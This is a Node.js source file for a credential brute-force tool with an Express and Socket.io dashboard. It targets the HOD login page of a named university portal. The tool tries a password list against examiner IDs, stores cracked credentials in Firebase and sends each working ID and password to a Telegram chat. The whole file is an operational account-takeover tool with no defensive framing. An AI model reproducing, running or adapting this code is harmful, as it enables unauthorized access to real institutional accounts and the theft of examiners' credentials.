require('dotenv').config();
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const axios = require('axios');
const admin = require('firebase-admin');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');

// ==================== CONFIGURATION ====================
const PORT = process.env.PORT || 3000;
const LOGIN_URL = process.env.LOGIN_URL || 'https://lnmuniversity.com/Lnmu_CIA/Home/Login';
const LOGIN_TYPE = process.env.LOGIN_TYPE || 'HOD';
const PASSWORD_FILE = process.env.PASSWORD_FILE || './password.txt';
const EXAMINER_FILE = process.env.EXAMINER_FILE || './examiners.json';

// ==================== FIREBASE (optional) ====================
let db = null;
let bot = null;
try {
  if (process.env.FIREBASE_CREDENTIALS_BASE64) {
    const decoded = Buffer.from(process.env.FIREBASE_CREDENTIALS_BASE64, 'base64').toString('utf8');
    const serviceAccount = JSON.parse(decoded);
    admin.initializeApp({ credential: admin.credential.cert(serviceAccount) });
    db = admin.firestore();
    console.log('✅ Firebase connected');
  }
} catch (err) {
  console.log('⚠️ Firebase not configured, running without database');
}

if (process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID) {
  bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: false });
  console.log('✅ Telegram ready');
}

// ==================== EXPRESS SETUP ====================
const app = express();
const server = http.createServer(app);
const io = socketIo(server);
app.use(express.static('public'));

// ==================== GLOBAL VARIABLES ====================
let isRunning = false;
let isPaused = false;
let examinerIds = [];
let passwords = [];        // Full password list (will load into memory - small file assumed)
let totalExaminers = 0;
let currentExaminerIndex = 0;
let currentPasswordIndex = 0;
let successes = new Map(); // examinerId -> password
let speedStats = { attempts: 0, startTime: null };

// ==================== LOAD FILES WITH ERROR CHECKING ====================
function loadExaminers() {
  try {
    const fullPath = path.resolve(EXAMINER_FILE);
    if (!fs.existsSync(fullPath)) {
      console.error(`❌ Examiner file not found: ${fullPath}`);
      // Create a sample file
      fs.writeFileSync(fullPath, JSON.stringify(['EC1032506', 'EC1032507'], null, 2));
      console.log(`📝 Created sample examiners.json at ${fullPath}`);
    }
    const data = fs.readFileSync(fullPath, 'utf8');
    examinerIds = JSON.parse(data);
    totalExaminers = examinerIds.length;
    console.log(`✅ Loaded ${totalExaminers} examiners from ${fullPath}`);
  } catch (err) {
    console.error('❌ Error loading examiners:', err.message);
    examinerIds = [];
    totalExaminers = 0;
  }
}

function loadPasswords() {
  try {
    const fullPath = path.resolve(PASSWORD_FILE);
    if (!fs.existsSync(fullPath)) {
      console.error(`❌ Password file not found: ${fullPath}`);
      // Create a sample password file
      fs.writeFileSync(fullPath, 'admin123\npassword\n123456\n');
      console.log(`📝 Created sample password.txt at ${fullPath}`);
    }
    const content = fs.readFileSync(fullPath, 'utf8');
    passwords = content.split(/\r?\n/).filter(line => line.trim().length > 0);
    console.log(`✅ Loaded ${passwords.length} passwords from ${fullPath}`);
    if (passwords.length === 0) {
      console.error('⚠️ Password file is empty!');
    }
  } catch (err) {
    console.error('❌ Error loading passwords:', err.message);
    passwords = [];
  }
}

// ==================== LOAD PREVIOUS SUCCESSES FROM FIREBASE ====================
async function loadExistingSuccesses() {
  if (!db) return;
  try {
    const snapshot = await db.collection('successful_logins').get();
    snapshot.forEach(doc => {
      const data = doc.data();
      successes.set(data.examinerId, data.password);
    });
    console.log(`📦 Loaded ${successes.size} existing successes from Firebase`);
  } catch (err) {
    console.error('⚠️ Could not load successes from Firebase:', err.message);
  }
}

// ==================== CHECKPOINT (save progress) ====================
async function saveCheckpoint() {
  if (!db) return;
  try {
    await db.collection('checkpoint').doc('current').set({
      examinerIndex: currentExaminerIndex,
      passwordIndex: currentPasswordIndex,
      successes: Array.from(successes.entries()),
      updatedAt: admin.firestore.FieldValue.serverTimestamp(),
      status: isPaused ? 'paused' : 'running'
    }, { merge: true });
  } catch (err) {
    console.error('Checkpoint save error:', err.message);
  }
}

async function loadCheckpoint() {
  if (!db) return;
  try {
    const doc = await db.collection('checkpoint').doc('current').get();
    if (doc.exists) {
      const data = doc.data();
      currentExaminerIndex = data.examinerIndex || 0;
      currentPasswordIndex = data.passwordIndex || 0;
      if (data.successes) {
        for (const [id, pwd] of data.successes) {
          if (!successes.has(id)) successes.set(id, pwd);
        }
      }
      console.log(`📌 Resuming from examiner ${currentExaminerIndex}, password #${currentPasswordIndex}`);
    }
  } catch (err) {
    console.error('Checkpoint load error:', err.message);
  }
}

// ==================== LOGIN ATTEMPT (single) ====================
async function tryLogin(examinerId, password) {
  try {
    const res = await axios.post(LOGIN_URL, {
      loginType: LOGIN_TYPE,
      userid: examinerId,
      password: password
    }, {
      timeout: 5000,
      headers: { 'User-Agent': 'Mozilla/5.0' }
    });
    speedStats.attempts++;
    return { success: !res.data.includes('Invalid'), password };
  } catch (err) {
    speedStats.attempts++;
    return { success: false };
  }
}

// ==================== PROCESS ONE EXAMINER (sequential passwords) ====================
async function processExaminer(examinerId, startPwdIndex) {
  let foundPassword = null;
  for (let i = startPwdIndex; i < passwords.length; i++) {
    if (!isRunning || isPaused) break;
    const password = passwords[i];
    const result = await tryLogin(examinerId, password);
    currentPasswordIndex = i + 1; // next starting index
    if (result.success) {
      foundPassword = result.password;
      break;
    }
    // Update progress every 10 attempts
    if ((i + 1) % 10 === 0) {
      const elapsed = (Date.now() - speedStats.startTime) / 1000;
      const speed = elapsed > 0 ? Math.round(speedStats.attempts / elapsed) : 0;
      io.emit('progress', {
        examinerIndex: currentExaminerIndex,
        totalExaminers,
        passwordIndex: i + 1,
        totalPasswords: passwords.length,
        currentExaminer: examinerId,
        speed
      });
      await saveCheckpoint();
    }
  }
  return { found: !!foundPassword, password: foundPassword };
}

// ==================== MAIN ATTACK LOOP ====================
async function startAttack() {
  if (isRunning) {
    console.log('Attack already running');
    return;
  }
  if (passwords.length === 0) {
    console.error('❌ No passwords loaded. Cannot start attack.');
    io.emit('status', { running: false, paused: false, message: 'No passwords loaded' });
    return;
  }
  isRunning = true;
  isPaused = false;
  speedStats.attempts = 0;
  speedStats.startTime = Date.now();
  io.emit('status', { running: true, paused: false });
  console.log('🚀 Attack started');

  for (let idx = currentExaminerIndex; idx < totalExaminers && isRunning && !isPaused; idx++) {
    const examinerId = examinerIds[idx];
    if (successes.has(examinerId)) {
      console.log(`⏭️ Skipping ${examinerId} (already found)`);
      continue;
    }
    currentExaminerIndex = idx;
    let startPwd = (idx === currentExaminerIndex) ? currentPasswordIndex : 0;
    console.log(`🔍 Trying examiner ${examinerId} from password #${startPwd}`);
    const result = await processExaminer(examinerId, startPwd);
    
    if (result.found) {
      console.log(`✅ SUCCESS: ${examinerId} : ${result.password}`);
      successes.set(examinerId, result.password);
      io.emit('success', { examinerId, password: result.password, time: new Date().toISOString() });
      if (db) {
        await db.collection('successful_logins').add({
          examinerId,
          password: result.password,
          timestamp: admin.firestore.FieldValue.serverTimestamp()
        });
      }
      if (bot) {
        const msg = `✅ *Valid!*\n👤 ${examinerId}\n🔑 ${result.password}`;
        await bot.sendMessage(process.env.TELEGRAM_CHAT_ID, msg, { parse_mode: 'Markdown' });
      }
    } else {
      console.log(`❌ No password found for ${examinerId}`);
    }
    // Reset for next examiner
    currentPasswordIndex = 0;
    await saveCheckpoint();
  }

  isRunning = false;
  await saveCheckpoint();
  io.emit('status', { running: false, paused: false, message: 'Finished' });
  console.log('🏁 Attack finished');
}

// ==================== SOCKET.IO EVENTS ====================
io.on('connection', (socket) => {
  console.log('🖥️ Web UI connected');
  socket.emit('init', {
    totalExaminers,
    successes: Array.from(successes.entries()).map(([id, pwd]) => ({ examinerId: id, password: pwd })),
    currentExaminerIndex,
    currentPasswordIndex,
    totalPasswords: passwords.length,
    isRunning,
    isPaused
  });

  socket.on('start', () => {
    console.log('Start command received');
    startAttack();
  });
  socket.on('pause', async () => {
    if (!isRunning) return;
    isPaused = true;
    isRunning = false;
    await saveCheckpoint();
    io.emit('status', { running: false, paused: true });
    console.log('⏸ Paused');
  });
  socket.on('resume', () => {
    console.log('Resume command received');
    startAttack();
  });
  socket.on('stop', async () => {
    isRunning = false;
    isPaused = false;
    currentExaminerIndex = 0;
    currentPasswordIndex = 0;
    successes.clear();
    await saveCheckpoint();
    io.emit('status', { running: false, paused: false });
    io.emit('init', {
      totalExaminers,
      successes: [],
      currentExaminerIndex: 0,
      currentPasswordIndex: 0,
      totalPasswords: passwords.length,
      isRunning: false,
      isPaused: false
    });
    console.log('⏹ Stopped and reset');
  });
});

// ==================== START SERVER ====================
loadExaminers();
loadPasswords();
(async () => {
  await loadExistingSuccesses();
  await loadCheckpoint();
  server.listen(PORT, () => {
    console.log(`✅ Server running at http://localhost:${PORT}`);
    console.log(`📊 Total examiners: ${totalExaminers}`);
    console.log(`🔑 Total passwords: ${passwords.length}`);
    if (passwords.length === 0) console.error('⚠️ No passwords! Check password.txt');
    if (totalExaminers === 0) console.error('⚠️ No examiners! Check examiners.json');
  });
})();
